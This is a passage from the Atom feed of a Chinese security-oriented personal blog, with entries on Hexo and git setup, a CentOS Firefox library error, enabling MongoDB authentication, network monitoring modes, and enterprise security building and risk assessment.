git</span><br><span class="line">  <span class="attribute">message</span>: <span class="string">"Update My Blog"</span></span><br><span class="line">  <span class="attribute">branch</span>: master</span><br><span class="line">  <span class="attribute">repository</span>: git<span class="variable">@github</span>.<span class="attribute">com</span>:Pa55w0rd/pa55w0rd-new.github.io.git</span><br></pre></td></tr></table></figure></p><h3 id="清除-clean"><a href="#清除-clean" class="headerlink" title="清除 clean"></a>清除 clean</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hexo clean</span></span><br></pre></td></tr></table></figure><h3 id="命令简写"><a href="#命令简写" class="headerlink" title="命令简写"></a>命令简写</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hexo g</span></span><br><span class="line"><span class="meta"># hexo s</span></span><br><span class="line"><span class="meta"># hexo d</span></span><br></pre></td></tr></table></figure><h2 id="0x03-jekyll-迁移至hexo"><a href="#0x03-jekyll-迁移至hexo" class="headerlink" title="0x03 jekyll 迁移至hexo"></a>0x03 jekyll 迁移至hexo</h2><p>把<code>_posts</code>文件夹内的所有文件复制到<code>source/_posts</code> 文件夹，并在<code>_config.yml</code>中修改 <code>new_post_name</code>参数。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">new_post_name:</span> <span class="symbol">:year-</span><span class="symbol">:month-</span><span class="symbol">:day-</span><span class="symbol">:title</span>.md</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。&lt;/p&gt;
    
    </summary>
    
      <category term="note" scheme="http://pa55w0rd.github.io/categories/note/"/>
    
    
      <category term="hexo" scheme="http://pa55w0rd.github.io/tags/hexo/"/>
    
      <category term="迁移" scheme="http://pa55w0rd.github.io/tags/%E8%BF%81%E7%A7%BB/"/>
    
  </entry>
  
  <entry>
    <title>Lynis + ansible</title>
    <link href="http://pa55w0rd.github.io/lynis/"/>
    <id>http://pa55w0rd.github.io/lynis/</id>
    <published>2018-11-16T07:57:42.000Z</published>
    <updated>2018-11-21T09:24:52.052Z</updated>
    
    <content type="html"><![CDATA[<p>Lynis是一款面向Linux、Mac OS X、BSD以及Solaris等Unix类系统的安全审计与强化工具。它能够深入扫描并检测系统中的问题、存在漏洞的软件包以及配置设置，并提出相关解决建议。Lynis能够轻松实现安全评估、合规性测试、漏洞检测、配置管理以及补丁管理。 </p><a id="more"></a><p>ansible</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Lynis是一款面向Linux、Mac OS X、BSD以及Solaris等Unix类系统的安全审计与强化工具。它能够深入扫描并检测系统中的问题、存在漏洞的软件包以及配置设置，并提出相关解决建议。Lynis能够轻松实现安全评估、合规性测试、漏洞检测、配置管理以及补丁管理。 &lt;/p&gt;
    
    </summary>
    
      <category term="note" scheme="http://pa55w0rd.github.io/categories/note/"/>
    
    
  </entry>
  
  <entry>
    <title>Git修改远程URL</title>
    <link href="http://pa55w0rd.github.io/git_edit_remoteurl/"/>
    <id>http://pa55w0rd.github.io/git_edit_remoteurl/</id>
    <published>2018-11-06T09:04:11.000Z</published>
    <updated>2018-11-20T10:31:41.568Z</updated>
    
    <content type="html"><![CDATA[<p>Github 设置使用了ssh key，每次提交代码还是需要输入用户名？？？</p><a id="more"></a><p>检查发现，在设置远程url的时候使用了https</p><p><a href="https://github.com/Pa55w0rd/pa55w0rd.github.io.git" target="_blank" rel="noopener">https://github.com/Pa55w0rd/pa55w0rd.github.io.git</a></p><p>使用git remote set-url命令从https切换到ssh<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># git remote <span class="keyword">set</span>-url <span class="comment">origin git+ssh:</span>//<span class="comment">git@github.com</span>/Pa55w0rd/<span class="comment">pa55w0rd.github.io.git</span></span><br></pre></td></tr></table></figure></p><p>通过git remote -v命令验证是否成功<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># git remote -v</span></span><br><span class="line"><span class="attribute">origin</span>  git+ssh://git<span class="variable">@github</span>.com/Pa55w0rd/pa55w0rd.github.io.git (fetch)</span><br><span class="line">origin  git+ssh://git<span class="variable">@github</span>.com/Pa55w0rd/pa55w0rd.github.io.git (push)</span><br></pre></td></tr></table></figure></p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="建立远程仓库"><a href="#建立远程仓库" class="headerlink" title="建立远程仓库"></a>建立远程仓库</h3><p>进入GitHub，点击右上角 + 号，选择New repository</p><p>输入仓库名称，点击 Create repository</p><h3 id="建立本地仓库"><a href="#建立本地仓库" class="headerlink" title="建立本地仓库"></a>建立本地仓库</h3><p>建立目录，将文件夹初始化为git可以管理的仓库</p><p>git init</p><h3 id="与远程仓库关联"><a href="#与远程仓库关联" class="headerlink" title="与远程仓库关联"></a>与远程仓库关联</h3><p>git remote add origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:Pa55w0rd/pa55w0rd.github.io.git</p><h3 id="添加到暂存区"><a href="#添加到暂存区" class="headerlink" title="添加到暂存区"></a>添加到暂存区</h3><p>git add .   </p><blockquote><p>注意最后边的 .</p></blockquote><h3 id="提交暂存区到仓库区"><a href="#提交暂存区到仓库区" class="headerlink" title="提交暂存区到仓库区"></a>提交暂存区到仓库区</h3><p>git commit -m “init”</p><h3 id="上传本地仓库到远程仓库"><a href="#上传本地仓库到远程仓库" class="headerlink" title="上传本地仓库到远程仓库"></a>上传本地仓库到远程仓库</h3><p>git push origin master</p><h3 id="显示变更的文件"><a href="#显示变更的文件" class="headerlink" title="显示变更的文件"></a>显示变更的文件</h3><p>git status</p><h3 id="克隆远程仓库到本地"><a href="#克隆远程仓库到本地" class="headerlink" title="克隆远程仓库到本地"></a>克隆远程仓库到本地</h3><p>git clone <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:Pa55w0rd/pa55w0rd.github.io.git</p><h3 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h3><p>参考 <a href="http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html" target="_blank" rel="noopener">阮一峰_ 常用Git命令清单</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Github 设置使用了ssh key，每次提交代码还是需要输入用户名？？？&lt;/p&gt;
    
    </summary>
    
      <category term="note" scheme="http://pa55w0rd.github.io/categories/note/"/>
    
    
  </entry>
  
  <entry>
    <title>Centos 7 运行firefox出错</title>
    <link href="http://pa55w0rd.github.io/linux_firefox_error/"/>
    <id>http://pa55w0rd.github.io/linux_firefox_error/</id>
    <published>2018-11-06T09:03:11.000Z</published>
    <updated>2018-11-20T10:28:22.136Z</updated>
    
    <content type="html"><![CDATA[<p>Centos 7 在firefox官网下载了最新的安装包，运行后提示</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># firefox</span><br><span class="line">XPCOMGlueLoad <span class="keyword">error</span> <span class="keyword">for</span> <span class="keyword">file</span> /root/fuzzingbox/firefox/libmozgtk.<span class="keyword">so</span>:</span><br><span class="line">libgtk-3.<span class="keyword">so</span>.0: cannot <span class="keyword">open</span> shared object <span class="keyword">file</span>: <span class="keyword">No</span> such <span class="keyword">file</span> or directory</span><br><span class="line">Couldn't load XPCOM.</span><br></pre></td></tr></table></figure><a id="more"></a><p>提示缺少libgtk-3.so库<br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">install</span> gtk3</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Centos 7 在firefox官网下载了最新的安装包，运行后提示&lt;/p&gt;
&lt;figure class=&quot;highlight stata&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# firefox&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;XPCOMGlueLoad &lt;span class=&quot;keyword&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;file&lt;/span&gt; /root/fuzzingbox/firefox/libmozgtk.&lt;span class=&quot;keyword&quot;&gt;so&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;libgtk-3.&lt;span class=&quot;keyword&quot;&gt;so&lt;/span&gt;.0: cannot &lt;span class=&quot;keyword&quot;&gt;open&lt;/span&gt; shared object &lt;span class=&quot;keyword&quot;&gt;file&lt;/span&gt;: &lt;span class=&quot;keyword&quot;&gt;No&lt;/span&gt; such &lt;span class=&quot;keyword&quot;&gt;file&lt;/span&gt; or directory&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Couldn&#39;t load XPCOM.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="note" scheme="http://pa55w0rd.github.io/categories/note/"/>
    
    
  </entry>
  
  <entry>
    <title>mongodb开启认证</title>
    <link href="http://pa55w0rd.github.io/mongodb_auth/"/>
    <id>http://pa55w0rd.github.io/mongodb_auth/</id>
    <published>2018-11-01T05:35:11.000Z</published>
    <updated>2018-11-21T08:48:19.641Z</updated>
    
    <content type="html"><![CDATA[<p>修改配置文件，开启认证</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># vi /etc/mongod.conf</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">    security:</span></span><br><span class="line"><span class="symbol">    authorization:</span>enablesd</span><br></pre></td></tr></table></figure><a id="more"></a><p>创建密码</p><ul><li><strong>db.createUser({ user: “w11scan”, pwd: “w11scan”, roles: [{ role: “dbOwner”, db: “w11scan_config” }] })</strong>  <br>mongo创建db密码</li><li><strong>db.auth(“useradmin”, “adminpassword”)</strong> <br>验证，1表示成功<br>mongodb中的用户是基于身份role的<ul><li>管理员账户的 role是 userAdminAnyDatabase，‘userAdmin’代表用户管理身份，’AnyDatabase’ 代表可以管理任何数据库。</li><li>dbOwner 代表数据库所有者角色，拥有最高该数据库最高权限。比如新建索引等</li><li>readWrite 该用户用于该数据的读写，只拥有读写权限。</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;修改配置文件，开启认证&lt;/p&gt;
&lt;figure class=&quot;highlight dts&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# vi /etc/mongod.conf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;symbol&quot;&gt;    security:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;symbol&quot;&gt;    authorization:&lt;/span&gt;enablesd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="note" scheme="http://pa55w0rd.github.io/categories/note/"/>
    
    
      <category term="mongodb" scheme="http://pa55w0rd.github.io/tags/mongodb/"/>
    
      <category term="数据库" scheme="http://pa55w0rd.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>旁路监控</title>
    <link href="http://pa55w0rd.github.io/%E6%97%81%E8%B7%AF%E7%9B%91%E6%8E%A7/"/>
    <id>http://pa55w0rd.github.io/旁路监控/</id>
    <published>2018-11-01T05:33:11.000Z</published>
    <updated>2018-11-20T10:28:03.398Z</updated>
    
    <content type="html"><![CDATA[<p>常见的网络监控模式可以分为两种：一种是旁路监控模式，另一种是串联监控模式。</p><p>“旁路监控模式”一般是指通过交换机等网络设备的“端口镜像”功能来实现监控，在此模式下，监控设备只需要连接到交换机的指定镜像端口，所以形象的称之为“旁路监控”。</p><p>而串联模式一般是通过网关、网桥或者代理服务器的模式来进行监控，由于监控设备做为网关或者网桥串联在网络中，所以称之为“串联监控模式”。</p><a id="more"></a><p>旁路模式的优缺点</p><p><strong>优点：</strong></p><ul><li><p>旁路监控模式部署起来比较灵活方便，只需要在交换机上面配置镜像端口即可。不会影响现有的网络结构。而串联模式一般要作为网关、网桥或者代理服务器，所以需要对现有网络结构进行变动。</p></li><li><p>旁路模式分析的是镜像端口拷贝过来的数据，对原始传递的数据包不会造成延时，不会对网速造成任何影响。而串联模式是串联在网络中的，那么所有的数据必须先经过监控系统，通过监控系统的分析检查之后，才能够发送到各个客户端，所以会对网速有一定的延时。</p></li><li><p>旁路监控设备一旦故障或者停止运行，不会影响现有网络。而串联监控设备如果出现故障，如无硬件bypass功能，会导致网络中断。</p></li></ul><p><strong>缺点：</strong></p><ul><li><p>需要交换机或者路由支持“端口镜像”功能才可以实现监控。</p></li><li><p>旁路模式采用发送RST包的方式来断开TCP连接，不能禁止UDP通讯。对于UDP应用，一般还需要在路由器上面禁止UDP端口进行配合。而串联模式不存在该问题。</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;常见的网络监控模式可以分为两种：一种是旁路监控模式，另一种是串联监控模式。&lt;/p&gt;
&lt;p&gt;“旁路监控模式”一般是指通过交换机等网络设备的“端口镜像”功能来实现监控，在此模式下，监控设备只需要连接到交换机的指定镜像端口，所以形象的称之为“旁路监控”。&lt;/p&gt;
&lt;p&gt;而串联模式一般是通过网关、网桥或者代理服务器的模式来进行监控，由于监控设备做为网关或者网桥串联在网络中，所以称之为“串联监控模式”。&lt;/p&gt;
    
    </summary>
    
      <category term="note" scheme="http://pa55w0rd.github.io/categories/note/"/>
    
    
  </entry>
  
  <entry>
    <title>基线加固文档</title>
    <link href="http://pa55w0rd.github.io/%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/"/>
    <id>http://pa55w0rd.github.io/基线加固/</id>
    <published>2018-11-01T05:32:11.000Z</published>
    <updated>2018-11-20T10:27:52.536Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/re4lity/Benchmarks" target="_blank" rel="noopener">https://github.com/re4lity/Benchmarks</a></p><p><a href="https://learn.cisecurity.org/benchmarks" target="_blank" rel="noopener">https://learn.cisecurity.org/benchmarks</a></p><p><a href="https://nvd.nist.gov/ncp/repository" target="_blank" rel="noopener">https://nvd.nist.gov/ncp/repository</a></p><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://github.com/re4lity/Benchmarks&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/re4lity/Benchmarks&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://learn.cisecurity.org/benchmarks&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://learn.cisecurity.org/benchmarks&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://nvd.nist.gov/ncp/repository&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://nvd.nist.gov/ncp/repository&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="安全建设" scheme="http://pa55w0rd.github.io/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
  </entry>
  
  <entry>
    <title>甲方安全建设步骤 By pirogue</title>
    <link href="http://pa55w0rd.github.io/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E6%AD%A5%E9%AA%A4/"/>
    <id>http://pa55w0rd.github.io/甲方安全建设步骤/</id>
    <published>2018-10-31T09:17:35.000Z</published>
    <updated>2018-11-21T08:50:13.296Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>资产梳理</p><ul><li>IP列表、业务分组(负责人、联系方向)、业务属性</li><li>业务端口</li><li>业务应用架构、技术堆栈</li></ul></li><li><p>边界安全，防火墙策略控制（需要梳理业务端口）</p></li></ol><a id="more"></a><pre><code>- 如果是硬件，使用防火墙统一控制- 如果是操作系统，Iptalbes＋IPSEC- 及时监控业务端口的变化（外部nmap扫描搜集结果比对，或者编写脚步放到运维平台收集系统监听端口和防火墙策略)- 跳板机安全控制</code></pre><ol start="3"><li><p>账户安全管理</p><ul><li>弱密码</li><li>root、sudoer权限</li><li>账户、授权、访问、审计等等</li></ul></li><li><p>服务器安全</p><ul><li>安全基线检测</li><li>操作审计</li><li>异常登录审计(日志收集分析)</li><li>漏洞清点/扫描，补丁修复测试和推进</li></ul></li><li><p>WEB安全</p><ul><li>应用渗透测试</li><li>接口安全(加密、通信)</li><li>webshell实时监测</li><li>Nginx日志分析/Nginx流量旁路分析</li></ul></li><li><p>业务风控安全</p><ul><li>用户安全机制（密码、验证码、登录）</li><li>交易安全</li></ul></li><li><p>安全培训</p><ul><li>安全意识培训</li><li>运维安全培训</li><li>WEB安全开发</li></ul></li><li><p>安全规范和流程</p><ul><li>人员入职账户开通</li><li>人员离职账户注销</li><li>服务器上下架安全管理</li><li>安全应急响应机制</li></ul></li><li><p>内网安全</p><ul><li>内网服务器安全</li><li>账户统一验证和管理机制(域ldap协议统一验证OA、RTX、邮件、内网业务系统)</li><li>弱口令监测(NTLM/LM)</li><li>账户异常登录</li><li>网络隔离（物理／虚拟化）</li><li>网络准入</li><li>PC安全（病毒统一管理、通知处理）</li></ul></li></ol><p><strong>一张图看透办公网安全 -Eleven</strong></p><p><img src="\assets\img\办公网安全.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;&lt;p&gt;资产梳理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IP列表、业务分组(负责人、联系方向)、业务属性&lt;/li&gt;
&lt;li&gt;业务端口&lt;/li&gt;
&lt;li&gt;业务应用架构、技术堆栈&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;边界安全，防火墙策略控制（需要梳理业务端口）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="安全建设" scheme="http://pa55w0rd.github.io/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="安全建设" scheme="http://pa55w0rd.github.io/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
      <category term="内网安全" scheme="http://pa55w0rd.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>企业安全建设中评估业务潜在风险的思路（转发）</title>
    <link href="http://pa55w0rd.github.io/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E4%B8%AD%E8%AF%84%E4%BC%B0%E4%B8%9A%E5%8A%A1%E6%BD%9C%E5%9C%A8%E9%A3%8E%E9%99%A9%E7%9A%84%E6%80%9D%E8%B7%AF/"/>
    <id>http://pa55w0rd.github.io/企业安全建设中评估业务潜在风险的思路/</id>
    <published>2018-10-31T09:16:35.000Z</published>
    <updated>2018-11-21T08:49:45.373Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>From : <a href="https://xz.aliyun.com/t/1529/" target="_blank" rel="noopener">elknot@360corpsec</a></p></blockquote><h2 id="0x00-写在前面："><a href="#0x00-写在前面：" class="headerlink" title="0x00 写在前面："></a>0x00 写在前面：</h2><p>昨天和某巨佬私下交流的时候，巨佬遇到了一个问题，甲方有一个比较难搞的需求：让这位巨佬给他提供一个安全攻击态势的模型。当时这个需求听完之后我觉得有点难办。但是后来想了一下也不是没有可能去做，由于以下的说法仅作为一些思路，落地性还有待考察，所以大家针对落地问题先不要去喷了。</p><h2 id="0x01-所谓安全攻击态势是什么"><a href="#0x01-所谓安全攻击态势是什么" class="headerlink" title="0x01 所谓安全攻击态势是什么"></a>0x01 所谓安全攻击态势是什么</h2><a id="more"></a><p>跟巨佬的进一步聊天中，我大概明白了甲方的意思：对下属子公司进行考核。其实巨佬自己也知道这个模型偏向于管理而非技术，只是需要技术数据的支撑。那么实际上其实根据我个人的理解就是：客户需要把业务系统所面临的潜在风险罗列出来，并且考核安全部门对于这些潜在风险的解决成果。</p><p>那么我们的思路就逐渐清晰了，我们需要了解的也就是业务系统会面临那些潜在的风险和安全部门应对这些风险的技战术手段。</p><h2 id="0x02-业务系统潜在风险"><a href="#0x02-业务系统潜在风险" class="headerlink" title="0x02 业务系统潜在风险"></a>0x02 业务系统潜在风险</h2><p>但从业务系统的潜在风险来判断的话，很多人第一反应就是日志，换句话说，很多领导要是问安全部门的同事我们系统的潜在风险是什么，经验不足的安全管理人员可能会马上从SIEM中抽取相关的安全日志（如果连SIEM都没有的话，那就是只能亲自动手去所有的安全设备的日志中逐条检索，所以针对大型的系统而言，规模越大SIEM的需求也就越高），然后按照攻击事件的数量排序，最后给出来一个所谓的“业务安全潜在风险分析报告”。但是各位仔细想一下就会发现这份报告实际上是有问题的，首先领导要的是“业务系统潜在风险”，而非是“已经发生的安全事件的统计”，换句话说安全部门提供的报告是领导期望的。那么如何评定业务系统的潜在风险呢？</p><p><strong>（1）业务系统活跃指数</strong></p><p>首先，针对一个系统而言，业务系统的活跃指数也就是能够被人访问到的几率是一个指标，如果这个业务系统被网络隔离了，也就只有内部的人可以访问的到，那么攻击面就大大减小了。那么如何判断这个系统的活跃指数呢。个人认为PV、UV、搜索引擎排名和Alexa指数这四个数据可以一定程度上来描述业务系统的活跃指数，PV、UV越大、搜索引擎排名越高、Alexa指数越高则说明了该系统被互联网用户访问到的可能性就越大，意味着被攻击的概率也就越高。</p><p><img src="\assets\img\xss\1.jpg" alt=""></p><p>上面这张图表示的就是Alexa的指数，指数越高也就是用户访问越频繁。当然这个只是其中的一方面，越活跃不一定代表受攻击的可能越大。</p><p><strong>（2）业务安全风险评定</strong></p><p>活跃指数只能判断出该业务系统被访问的次数，但是这仅仅是外因。被攻击的可能起决定因素的不是外因而是内因。所谓的内因也就是业务系统资深的原因，比如说用了不安全的框架、中间件存在已知漏洞、管理平台弱口令等等，然而这些问题其实解决起来不是特别的容易，一方面原因是业务系统稳定之后不太可能进行大范围的重构，二是因为开发部门对于安全方面可能不是特别懂，甚至有些大哥直接把测试环境部署到外网上去。</p><p>其实这些问题如果企业按部就班的走SDL的话，问题应该不大，因为SDL对于系统的安全开发存在一步威胁建模，就比如下面这张图：</p><p><img src="\assets\img\威胁类别与应对策略.png" alt=""></p><p> STRIDE威胁建模其实是一个很好的评估手段，但是很不幸，很多业务并不会去遵守这一套，这里安全部门就要多跑腿了，要定期对业务系统进行主动的渗透测试和安全监测，保证业务系统不存在可以被恶意利用的漏洞，</p><p> <strong>（3）历史攻击攻击行为比对</strong></p><p>这一部分其实就是从SIEM中抽取对应业务系统的安全日志，然后将其统计分类最后按照影响范围统计出来攻击的行为，但是这么做的话还远远不够，因为攻击日志里面有些是成功的有些是失败的，有些是人产生的有些是机器产生的。判断历史攻击行为的时候应当注意以下几点：</p><ol><li>确保SIEM中日志的有效性和准确性</li><li>统计攻击事件中成功次数与总次数所占的比例</li><li>列出所有攻击行为有特点的IP进行简单溯源</li><li>对攻击成功的IP进行重点监测并进行针对性溯源</li><li>回顾以往众测或者企业SRC收上来的漏洞利用报告</li></ol><p>这样的话你将会得到：</p><ul><li>一份带有详细数据的事件统计报告</li><li>一份发起攻击行为IP的列表</li><li>一份成功发起攻击行为IP的列表</li><li>N份漏洞利用及分析报告</li></ul><p>统计完成之后接下来就可以进行下一环节。</p><p><strong>（4）IP溯源及引入情报体系</strong></p><p>上面我们得到了一些攻击IP的数据，有些是成功的有些是失败的，这时候我们可以利用外部的威胁情报数据对这些IP进行浅层次或者深层次的溯源，浅层次的溯源主要是针对发起攻击但是失败的，需要收集的信息包括：IP的信誉度、地理位置、绑定的域名、域名注册时间、接入类型、被恶意标记的内容。</p><p>这些信息可以帮助我们去判断这些IP是不是肉鸡还是真实的攻击者，举个例子，假设一个IP的是一个荷兰OVH的主机，对我们输出的日志大多数都为扫描、注入类型的攻击，我们只接通过网络策略把这个IP拉黑了就可以了，因为他不是一个真是的攻击者而是一台肉鸡。相反的，如果一个IP攻击的行为包括社工、撞库、恶意漏洞利用、shell管理，并且接入方式是家庭宽带动态IP，那么这个IP我们就应该重点关注，甚至对其进行更深层次的溯源分析。</p><p>所谓深层次溯源分析，针对的主要是一些攻击行为有特点且明显不是自动化行为的攻击，比如上面那个例子。深层的溯源不是要把这个人的户口本全查一遍，然后家里几亩地，地里几头牛这些全都搞出来。之前我在ISC2017的大数据威胁分析论坛上面分享过我个人的观点——真的没必要大费周章把攻击的人直接抓出来，劳民伤财又费力不讨好，甚至没准还会触犯法律。我们需要明白的是攻击者瞄准的目标、攻击的套路和攻击者到底是出于什么样的目的攻击就足够了。</p><p>针对高级的溯源，我们需要采集的数据是：</p><ul><li>攻击者使用的基础设施</li><li>攻击者的意图</li><li>攻击者的成功率</li><li>攻击者的Kill-Chain模型</li><li>攻击者瞄准的行业和系统</li></ul><p>那么实际上高级溯源的结果我们也是有所区分的，比如说某些攻击者满天撒网导出扫描，抓到一个搞一个，这种的攻击者其实是没有价值的，通过网络策略直接ban了就完了。但是如果瞄准特定行业，攻击手段比较黑科技，而且Kill-Chain完整，攻击能力稳准狠，对待这种攻击者我们就应该去重点观察一下了，比如说把他的所有流量通过流量牵引到蜜罐里，观察他的操作。</p><p>其实说到这里，我们研究了所有的攻击者，可以把攻击我们的人都是什么来路摸清楚了。</p><p><strong>（5）SOC团队素质</strong></p><p>敌人分析完了，我们自己人也得分析分析，分析自己人最好的方法其实就是三个场景：重保、演习和众测。</p><p>出去前一个是有个别地方有需求，其他的两个都是可以找第三方团队去做的，主要目的是为了测试SOC针对外部威胁如何快速准确定位然后消灭威胁。</p><p>根据PDR模型来判断，如果响应时间Rt和检测时间Dt事件越短，同时防御时间Pt可以做到足够的长。攻击者得手的可能性越低。</p><h2 id="0x03-写报告"><a href="#0x03-写报告" class="headerlink" title="0x03 写报告"></a>0x03 写报告</h2><p>笔者个人认为态势感知不是跟x管家、x卫士那种随便打个分数就完了，态势感知的目的是为了给客户提供潜在的攻击行为和应对的策略，应该是完整的建议。态势感知如果要是打分的话这个产品一定是假的，大家不要相信。</p><p>如果输出报告的话，报告中应包含</p><ul><li>内因分析：威胁建模、安全手段评估、SOC素质、渗透测试和众测等</li><li>外因分析：业务系统活跃度、对外ACL、外部情报数据和对攻击者的认知。</li></ul><p>具体怎么写，相信愿意看这篇文章的人应该都比我懂。</p><p><strong>p.s.</strong> 文章仅代表个人观点，不代表其它的观点。</p><p><strong>Q：</strong>评价业务安全风险的时候，是不是也应该包括业务所处基础环境的安全风险（物理、所处网络环境、操作系统及一些框架之类的）？</p><p><strong>A：</strong>首先，您说的这些东西都是包含在内的，这一部分都已经集成到SDL和威胁建模环节，具体的一个业务上线流程请看</p><p><img src="\assets\img\xss\3.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;From : &lt;a href=&quot;https://xz.aliyun.com/t/1529/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;elknot@360corpsec&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-写在前面：&quot;&gt;&lt;a href=&quot;#0x00-写在前面：&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面：&quot;&gt;&lt;/a&gt;0x00 写在前面：&lt;/h2&gt;&lt;p&gt;昨天和某巨佬私下交流的时候，巨佬遇到了一个问题，甲方有一个比较难搞的需求：让这位巨佬给他提供一个安全攻击态势的模型。当时这个需求听完之后我觉得有点难办。但是后来想了一下也不是没有可能去做，由于以下的说法仅作为一些思路，落地性还有待考察，所以大家针对落地问题先不要去喷了。&lt;/p&gt;
